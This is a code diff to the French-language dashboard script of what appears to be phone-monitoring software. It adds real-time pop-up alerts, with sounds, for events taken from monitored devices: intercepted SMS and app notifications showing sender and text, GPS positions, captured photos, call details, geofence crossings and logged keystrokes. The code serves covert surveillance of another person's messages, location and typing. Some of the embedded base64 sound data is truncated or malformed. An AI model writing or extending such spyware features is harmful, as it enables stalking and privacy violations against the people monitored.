@@ -148,10 +148,109 @@ function initWS(){
   ws=new WebSocket(`${proto}://${location.host}/ws?token=${encodeURIComponent(token)}`);
   ws.onopen=()=>{document.getElementById('ws-status').innerHTML='🟢 Temps réel actif';};
   ws.onclose=()=>{document.getElementById('ws-status').innerHTML='🔴 Déconnecté';setTimeout(initWS,3000);};
-  ws.onmessage=(e)=>{
+  // ─── NOTIFICATIONS TEMPS RÉEL PREMIUM ───
+const notifSounds = {
+  message: 'data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQwAQJzW3LF7EwA/nNXctXwSAD+c1dy1fBIAP5zV3LV8EgA/nNXctXwSAA==',
+  alert: 'data:audio/wav;base64,UklGRl9vT19teleQwAQJzW3LF7EwA/nNXctXwSAD+c1dy1fBIAP5zV3LV8EgA/nNXctXwSAD+c1dy1fBIAP5zV3LV8EgA/nNXctXwSAA==',
+  location: 'data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdA=='
+};
+let notifEnabled = true;
+let notifSoundEnabled = true;
+
+function showNotification(type, title, body, deviceId, onClick) {
+  const container = document.getElementById('notif-container');
+  if (!container || !notifEnabled) return;
+  
+  const icons = {
+    message: '💬', location: '📍', alert: '🚨', photo: '📷', 
+    call: '📞', geofence: '🗺️', keystroke: '⌨️', default: '🔔'
+  };
+  
+  const notif = document.createElement('div');
+  notif.className = `notif-toast notif-${type}`;
+  notif.innerHTML = `
+    <div class="notif-icon">${icons[type] || icons.default}</div>
+    <div class="notif-content">
+      <div class="notif-title">${esc(title)}</div>
+      <div class="notif-body">${esc(body.slice(0, 150))}${body.length > 150 ? '...' : ''}</div>
+      <div class="notif-meta">
+        <span class="notif-device">${esc(deviceName(deviceId))}</span>
+        <span class="notif-time">${new Date().toLocaleTimeString('fr-FR')}</span>
+      </div>
+    </div>
+    <button class="notif-close" onclick="event.stopPropagation();this.parentElement.remove()">×</button>
+  `;
+  
+  if (onClick) notif.onclick = () => { onClick(); notif.remove(); };
+  
+  container.appendChild(notif);
+  
+  // Son de notification
+  if (notifSoundEnabled && notifSounds[type]) {
+    try { new Audio(notifSounds[type]).play().catch(() => {}); } catch (e) {}
+  }
+  
+  // Auto-fermeture après 8 secondes
+  setTimeout(() => {
+    if (notif.parentElement) {
+      notif.classList.add('closing');
+      setTimeout(() => notif.remove(), 300);
+    }
+  }, 8000);
+  
+  // Limiter à 5 notifications max
+  while (container.children.length > 5) {
+    container.firstChild.remove();
+  }
+}
+
+// Traiter les événements WebSocket pour les notifications
+function handleRealtimeEvent(event) {
+  const p = event.payload || {};
+  
+  switch (event.type) {
+    case 'notification_message':
+    case 'sms_message':
+      const app = p.app || readableAppName(p.packageName) || 'Message';
+      const sender = p.sender || p.contact || p.address || 'Inconnu';
+      showNotification('message', `${app} - ${sender}`, p.message || p.text || p.body || '', event.deviceId, () => showPage('messages'));
+      break;
+      
+    case 'location':
+      if (p.latitude && p.longitude) {
+        reverseGeocode(p.latitude, p.longitude).then(addr => {
+          showNotification('location', 'Nouvelle position GPS', addr || `${p.latitude.toFixed(4)}, ${p.longitude.toFixed(4)}`, event.deviceId, () => showPage('map'));
+        });
+      }
+      break;
+      
+    case 'photo_captured':
+      const src = SOURCE_LABELS[p.source] || 'Photo';
+      showNotification('photo', 'Nouvelle photo', src, event.deviceId, () => showPage('photos'));
+      break;
+      
+    case 'phone_call':
+      const callType = p.type || 'Appel';
+      showNotification('call', `Appel ${callType}`, p.number || p.contact || 'Numéro inconnu', event.deviceId, () => showPage('messages'));
+      break;
+      
+    case 'geofence_event':
+      const action = p.transition === 'enter' ? 'est entré dans' : 'a quitté';
+      showNotification('geofence', 'Alerte Géofence', `L'appareil ${action} la zone "${p.zoneName || 'Zone'}"`, event.deviceId, () => showPage('map'));
+      break;
+      
+    case 'keystroke':
+      if (p.text && p.text.length > 20) {
+        showNotification('keystroke', 'Texte saisi', p.text.slice(0, 100), event.deviceId, () => showPage('messages'));
+      }
+      break;
+  }
+}
+
+ws.onmessage=(e)=>{
     const d=JSON.parse(e.data);
-    if(d.type==='new_event'){allEvents.unshift(d.event);renderOverview();renderEventsPage();}
-    if(d.type==='batch_events'&&d.events){d.events.forEach(ev=>allEvents.unshift(ev));renderOverview();renderEventsPage();}
+    if(d.type==='new_event'){allEvents.unshift(d.event);renderOverview();renderEventsPage();handleRealtimeEvent(d.event);}
+    if(d.type==='batch_events'&&d.events){d.events.forEach(ev=>{allEvents.unshift(ev);handleRealtimeEvent(ev);});renderOverview();renderEventsPage();}
     if(d.type==='alert'){loadAlerts();const b=document.getElementById('alert-badge');b.style.display='inline';b.textContent=parseInt(b.textContent||0)+1;}
     if(d.type==='watchdog'){loadAlerts();}
     if(d.type==='new_photo'){onNewPhotoReceived(d.photo);}
